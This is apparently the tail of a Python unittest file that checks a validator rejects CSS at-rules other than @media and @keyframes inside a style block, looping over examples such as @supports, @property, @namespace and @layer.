        for rule in ("@supports (display: grid) { .x { display: grid; } }", "@property --x { syntax: '*'; }",
                     "@namespace svg x;", "@layer x;"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("the only at-rules it may hold are @media and @keyframes")


if __name__ == "__main__":
    unittest.main()
